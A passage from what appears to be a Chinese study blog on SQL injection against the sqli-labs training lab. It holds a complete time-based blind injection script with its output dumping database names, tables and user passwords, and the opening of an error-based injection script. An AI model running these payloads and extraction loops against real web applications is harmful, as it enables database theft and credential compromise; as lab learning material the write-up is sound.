&#x27;stupid@dhakkan.local&#x27;]</span><br><span class="line">第6条: [&#x27;6&#x27;, &#x27;superman@dhakkan.local&#x27;]</span><br><span class="line">第7条: [&#x27;7&#x27;, &#x27;batman@dhakkan.local&#x27;]</span><br><span class="line">第8条: [&#x27;8&#x27;, &#x27;admin@dhakkan.com&#x27;]</span><br><span class="line"></span><br><span class="line">referers表的数据：</span><br><span class="line">共有0条记录</span><br><span class="line"></span><br><span class="line">uagents表的数据：</span><br><span class="line">共有0条记录</span><br><span class="line"></span><br><span class="line">users表的数据：</span><br><span class="line">共有13条记录</span><br><span class="line">第1条: [&#x27;1&#x27;, &#x27;Dumb&#x27;, &#x27;Dumb&#x27;, &#x27;1&#x27;, &#x27;Dumb&#x27;, &#x27;Dumb&#x27;]</span><br><span class="line">第2条: [&#x27;2&#x27;, &#x27;Angelina&#x27;, &#x27;I-kill-you&#x27;, &#x27;2&#x27;, &#x27;Angelina&#x27;, &#x27;I-kill-you&#x27;]</span><br><span class="line">第3条: [&#x27;3&#x27;, &#x27;Dummy&#x27;, &#x27;p@ssword&#x27;, &#x27;3&#x27;, &#x27;Dummy&#x27;, &#x27;p@ssword&#x27;]</span><br><span class="line">第4条: [&#x27;4&#x27;, &#x27;secure&#x27;, &#x27;crappy&#x27;, &#x27;4&#x27;, &#x27;secure&#x27;, &#x27;crappy&#x27;]</span><br><span class="line">第5条: [&#x27;5&#x27;, &#x27;stupid&#x27;, &#x27;stupidity&#x27;, &#x27;5&#x27;, &#x27;stupid&#x27;, &#x27;stupidity&#x27;]</span><br><span class="line">第6条: [&#x27;6&#x27;, &#x27;superman&#x27;, &#x27;genious&#x27;, &#x27;6&#x27;, &#x27;superman&#x27;, &#x27;genious&#x27;]</span><br><span class="line">第7条: [&#x27;7&#x27;, &#x27;batman&#x27;, &#x27;mob!le&#x27;, &#x27;7&#x27;, &#x27;batman&#x27;, &#x27;mob!le&#x27;]</span><br><span class="line">第8条: [&#x27;8&#x27;, &#x27;admin&#x27;, &#x27;admin&#x27;, &#x27;8&#x27;, &#x27;admin&#x27;, &#x27;admin&#x27;]</span><br><span class="line">第9条: [&#x27;9&#x27;, &#x27;admin1&#x27;, &#x27;admin1&#x27;, &#x27;9&#x27;, &#x27;admin1&#x27;, &#x27;admin1&#x27;]</span><br><span class="line">第10条: [&#x27;10&#x27;, &#x27;admin2&#x27;, &#x27;admin2&#x27;, &#x27;10&#x27;, &#x27;admin2&#x27;, &#x27;admin2&#x27;]</span><br><span class="line">第11条: [&#x27;11&#x27;, &#x27;admin3&#x27;, &#x27;admin3&#x27;, &#x27;11&#x27;, &#x27;admin3&#x27;, &#x27;admin3&#x27;]</span><br><span class="line">第12条: [&#x27;12&#x27;, &#x27;dhakkan&#x27;, &#x27;dumbo&#x27;, &#x27;12&#x27;, &#x27;dhakkan&#x27;, &#x27;dumbo&#x27;]</span><br><span class="line">第13条: [&#x27;14&#x27;, &#x27;admin4&#x27;, &#x27;admin4&#x27;, &#x27;14&#x27;, &#x27;admin4&#x27;, &#x27;admin4&#x27;]</span><br></pre></td></tr></table></figure><h1 id="时间盲注脚本"><a href="#时间盲注脚本" class="headerlink" title="时间盲注脚本"></a>时间盲注脚本</h1><p>下面是一个比较我认为比较简洁的时间盲注的脚本，本可以根据布尔盲注的脚本简单更改的，但是这种脚本也值得学习，借鉴</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://sql/sqli-labs/Less-10/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_len</span>():</span><br><span class="line">    <span class="comment">#获取数据库名称长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        payload = <span class="string">f&#x27;?id=1&quot; and if(length(database())=<span class="subst">&#123;i&#125;</span>,sleep(3),0)--+&#x27;</span></span><br><span class="line">        time1 = datetime.datetime.now()</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        time2 = datetime.datetime.now()</span><br><span class="line">        sec = (time2 - time1).seconds</span><br><span class="line">        <span class="keyword">if</span> sec &gt;= <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;数据库长度:&#x27;</span>, i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_name</span>(<span class="params">length</span>):</span><br><span class="line">    <span class="comment">#获取数据库名称</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):  <span class="comment"># 遍历所有可打印ASCII字符</span></span><br><span class="line">            payload = <span class="string">f&#x27;?id=1&quot; and if(ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(3),0)--+&#x27;</span></span><br><span class="line">            time1 = datetime.datetime.now()</span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            time2 = datetime.datetime.now()</span><br><span class="line">            sec = (time2 - time1).seconds</span><br><span class="line">            <span class="keyword">if</span> sec &gt;= <span class="number">3</span>:</span><br><span class="line">                name += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;当前数据库名:&#x27;</span>, name)</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;最终数据库名:&#x27;</span>, name)</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_name</span>():</span><br><span class="line">    <span class="comment">#获取所有表名</span></span><br><span class="line">    tables = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">            found = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">                payload = <span class="string">f&#x27;?id=1&quot; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="subst">&#123;k&#125;</span>,1),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(3),0)--+&#x27;</span></span><br><span class="line">                time1 = datetime.datetime.now()</span><br><span class="line">                r = requests.get(url + payload)</span><br><span class="line">                time2 = datetime.datetime.now()</span><br><span class="line">                sec = (time2 - time1).seconds</span><br><span class="line">                <span class="keyword">if</span> sec &gt;= <span class="number">3</span>:</span><br><span class="line">                    name += <span class="built_in">chr</span>(j)</span><br><span class="line">                    found = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> name:</span><br><span class="line">            tables.append(name)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;发现表 <span class="subst">&#123;k+<span class="number">1</span>&#125;</span>:&quot;</span>, name)</span><br><span class="line">    <span class="keyword">return</span> tables</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_name</span>(<span class="params">table_name</span>):</span><br><span class="line">    <span class="comment">#获取指定表的所有列名</span></span><br><span class="line">    columns = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">            found = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">                payload = <span class="string">f&#x27;?id=1&quot; and if(ascii(substr((select distinct column_name from information_schema.columns where table_name=&quot;<span class="subst">&#123;table_name&#125;</span>&quot; and table_schema=database() limit <span class="subst">&#123;k&#125;</span>,1),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(3),0)--+&#x27;</span></span><br><span class="line">                time1 = datetime.datetime.now()</span><br><span class="line">                r = requests.get(url + payload)</span><br><span class="line">                time2 = datetime.datetime.now()</span><br><span class="line">                sec = (time2 - time1).seconds</span><br><span class="line">                <span class="keyword">if</span> sec &gt;= <span class="number">3</span>:</span><br><span class="line">                    name += <span class="built_in">chr</span>(j)</span><br><span class="line">                    found = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> columns:  <span class="comment">#检验列名是否为真，并且是否不存在与columns列表中，避免重复添加相同的列名</span></span><br><span class="line">            columns.append(name)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;表 <span class="subst">&#123;table_name&#125;</span> 的列 <span class="subst">&#123;k+<span class="number">1</span>&#125;</span>:&quot;</span>, name)</span><br><span class="line">    <span class="keyword">return</span> columns</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">data</span>(<span class="params">column, table</span>):</span><br><span class="line">    <span class="comment">#获取指定表的数据</span></span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">            found = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">                payload = <span class="string">f&#x27;?id=1&quot; and if(ascii(substr((select <span class="subst">&#123;column&#125;</span> from <span class="subst">&#123;table&#125;</span> limit <span class="subst">&#123;k&#125;</span>,1),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(3),0)--+&#x27;</span></span><br><span class="line">                time1 = datetime.datetime.now()</span><br><span class="line">                r = requests.get(url + payload)</span><br><span class="line">                time2 = datetime.datetime.now()</span><br><span class="line">                sec = (time2 - time1).seconds</span><br><span class="line">                <span class="keyword">if</span> sec &gt;= <span class="number">3</span>:</span><br><span class="line">                    name += <span class="built_in">chr</span>(j)</span><br><span class="line">                    found = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> name:</span><br><span class="line">            results.append(name)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;表 <span class="subst">&#123;table&#125;</span> 的 <span class="subst">&#123;column&#125;</span> 数据 <span class="subst">&#123;k+<span class="number">1</span>&#125;</span>:&quot;</span>, name)</span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始SQL盲注测试...&quot;</span>)</span><br><span class="line">    length = database_len()</span><br><span class="line">    <span class="keyword">if</span> length &gt; <span class="number">0</span>:</span><br><span class="line">        db_name = database_name(length)</span><br><span class="line">        tables = table_name()</span><br><span class="line">        <span class="keyword">if</span> tables:</span><br><span class="line">            <span class="keyword">for</span> table <span class="keyword">in</span> tables:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n正在获取表 <span class="subst">&#123;table&#125;</span> 的列信息...&quot;</span>)</span><br><span class="line">                columns = column_name(table)</span><br><span class="line">                <span class="keyword">if</span> columns:</span><br><span class="line">                    <span class="keyword">for</span> column <span class="keyword">in</span> columns:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;\n正在获取表 <span class="subst">&#123;table&#125;</span> 的列 <span class="subst">&#123;column&#125;</span> 的数据...&quot;</span>)</span><br><span class="line">                        data(column, table)</span><br><span class="line">    <span class="comment"># 最后这一段能够体现出对函数的逐层调用的过程</span></span><br></pre></td></tr></table></figure><p>下面是脚本运行的结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">开始SQL盲注测试...</span><br><span class="line">数据库长度: 8</span><br><span class="line">当前数据库名: s</span><br><span class="line">当前数据库名: se</span><br><span class="line">当前数据库名: sec</span><br><span class="line">当前数据库名: secu</span><br><span class="line">当前数据库名: secur</span><br><span class="line">当前数据库名: securi</span><br><span class="line">当前数据库名: securit</span><br><span class="line">当前数据库名: security</span><br><span class="line">最终数据库名: security</span><br><span class="line">发现表 1: emails</span><br><span class="line">发现表 2: referers</span><br><span class="line">发现表 3: uagents</span><br><span class="line">发现表 4: users</span><br><span class="line"></span><br><span class="line">正在获取表 emails 的列信息...</span><br><span class="line">表 emails 的列 1: id</span><br><span class="line">表 emails 的列 2: email_id</span><br><span class="line"></span><br><span class="line">正在获取表 emails 的列 id 的数据...</span><br><span class="line">表 emails 的 id 数据 1: 1</span><br><span class="line">表 emails 的 id 数据 2: 2</span><br><span class="line">表 emails 的 id 数据 3: 3</span><br><span class="line">表 emails 的 id 数据 4: 4</span><br><span class="line">表 emails 的 id 数据 5: 5</span><br><span class="line">表 emails 的 id 数据 6: 6</span><br><span class="line">表 emails 的 id 数据 7: 7</span><br><span class="line">表 emails 的 id 数据 8: 8</span><br><span class="line"></span><br><span class="line">正在获取表 emails 的列 email_id 的数据...</span><br><span class="line">表 emails 的 email_id 数据 1: Dumb@dhakkan.com</span><br><span class="line">表 emails 的 email_id 数据 2: Angel@iloveu.com</span><br><span class="line">表 emails 的 email_id 数据 3: Dummy@dhakkan.local</span><br><span class="line">表 emails 的 email_id 数据 4: secure@dhakkan.local</span><br><span class="line">表 emails 的 email_id 数据 5: stupid@dhakkan.local</span><br><span class="line">表 emails 的 email_id 数据 6: superman@dhakkan.local</span><br><span class="line">表 emails 的 email_id 数据 7: batman@dhakkan.local</span><br><span class="line">表 emails 的 email_id 数据 8: admin@dhakkan.com</span><br><span class="line"></span><br><span class="line">正在获取表 referers 的列信息...</span><br><span class="line">表 referers 的列 1: id</span><br><span class="line">表 referers 的列 2: referer</span><br><span class="line">表 referers 的列 3: ip_address</span><br><span class="line"></span><br><span class="line">正在获取表 referers 的列 id 的数据...</span><br><span class="line"></span><br><span class="line">正在获取表 referers 的列 referer 的数据...</span><br><span class="line"></span><br><span class="line">正在获取表 referers 的列 ip_address 的数据...</span><br><span class="line"></span><br><span class="line">正在获取表 uagents 的列信息...</span><br><span class="line">表 uagents 的列 1: id</span><br><span class="line">表 uagents 的列 2: uagent</span><br><span class="line">表 uagents 的列 3: ip_address</span><br><span class="line">表 uagents 的列 4: username</span><br><span class="line"></span><br><span class="line">正在获取表 uagents 的列 id 的数据...</span><br><span class="line"></span><br><span class="line">正在获取表 uagents 的列 uagent 的数据...</span><br><span class="line"></span><br><span class="line">正在获取表 uagents 的列 ip_address 的数据...</span><br><span class="line"></span><br><span class="line">正在获取表 uagents 的列 username 的数据...</span><br><span class="line"></span><br><span class="line">正在获取表 users 的列信息...</span><br><span class="line">表 users 的列 1: id</span><br><span class="line">表 users 的列 2: username</span><br><span class="line">表 users 的列 3: password</span><br><span class="line"></span><br><span class="line">正在获取表 users 的列 id 的数据...</span><br><span class="line">表 users 的 id 数据 1: 1</span><br><span class="line">表 users 的 id 数据 2: 2</span><br><span class="line">表 users 的 id 数据 3: 3</span><br><span class="line">表 users 的 id 数据 4: 4</span><br><span class="line">表 users 的 id 数据 5: 5</span><br><span class="line">表 users 的 id 数据 6: 6</span><br><span class="line">表 users 的 id 数据 7: 7</span><br><span class="line">表 users 的 id 数据 8: 8</span><br><span class="line">表 users 的 id 数据 9: 9</span><br><span class="line">表 users 的 id 数据 10: 10</span><br><span class="line"></span><br><span class="line">正在获取表 users 的列 username 的数据...</span><br><span class="line">表 users 的 username 数据 1: Dumb</span><br><span class="line">表 users 的 username 数据 2: Angelina</span><br><span class="line">表 users 的 username 数据 3: Dummy</span><br><span class="line">表 users 的 username 数据 4: secure</span><br><span class="line">表 users 的 username 数据 5: stupid</span><br><span class="line">表 users 的 username 数据 6: superman</span><br><span class="line">表 users 的 username 数据 7: batman</span><br><span class="line">表 users 的 username 数据 8: admin</span><br><span class="line">表 users 的 username 数据 9: admin1</span><br><span class="line">表 users 的 username 数据 10: admin2</span><br><span class="line"></span><br><span class="line">正在获取表 users 的列 password 的数据...</span><br><span class="line">表 users 的 password 数据 1: Dumb</span><br><span class="line">表 users 的 password 数据 2: I-kill-you</span><br><span class="line">表 users 的 password 数据 3: p@ssword</span><br><span class="line">表 users 的 password 数据 4: crappy</span><br><span class="line"></span><br><span class="line">表 users 的 password 数据 5: stupidity</span><br><span class="line">表 users 的 password 数据 6: genious</span><br><span class="line">表 users 的 password 数据 7: mob!le</span><br><span class="line">表 users 的 password 数据 8: admin</span><br><span class="line">表 users 的 password 数据 9: admin1</span><br><span class="line">表 users 的 password 数据 10: admin2</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="报错注入脚本"><a href="#报错注入脚本" class="headerlink" title="报错注入脚本"></a>报错注入脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SQLiExplorer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):  <span class="comment"># 初始化类</span></span><br><span class="line">        <span class="variable language_">self</span>.databases = []  <span class="comment"># 存储数据库名</span></span><br><span class="line">        <span class="variable language_">self</span>.tables = []  <span class="comment"># 存储表名</span></span><br><span class="line">        <span class="variable language_">self</span>.columns = []  <span class="comment"># 存储列名</span></span><br><span class="line">        <span class="variable language_">self</span>.data = []  <span class="comment"># 存储查询到的数据</span></span><br><span class="line">        <span class="variable language_">self</span>.pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;error: \&#x27;~(.*?)~\&#x27;&#x27;</span>, re.S)  <span class="comment"># 正则表达式子从错误数据中提取数据</span></span><br><span class="line">        <span class="variable language_">self</span>.headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&#x27;</span></span><br><span class="line">        &#125;  <span class="comment"># 伪造HTTP请求头设置</span></span><br><span class="line">        <span class="variable language_">self</span>.base_url = <span class="string">&quot;http://sql/sqli-labs/Less-5/?id=1 &#x27;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.current_user = <span class="literal">None</span>  <span class="comment"># 存储当前的数据库信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_payload</span>(<span class="params">self, payload</span>):  <span class="comment"># self表示该方法属于类实例，可以访问类属性和其他方法</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;发送payload并返回响应&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = <span class="string">f&quot;<span class="subst">&#123;self.base_url&#125;</span><span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">            response = requests.get(url, headers=<span class="variable language_">self</span>.headers, timeout=<span class="number">10</span>)  <span class="comment"># 设置10秒等待，避免无限等待</span></span><br><span class="line">            response.raise_for_status()  <span class="comment"># 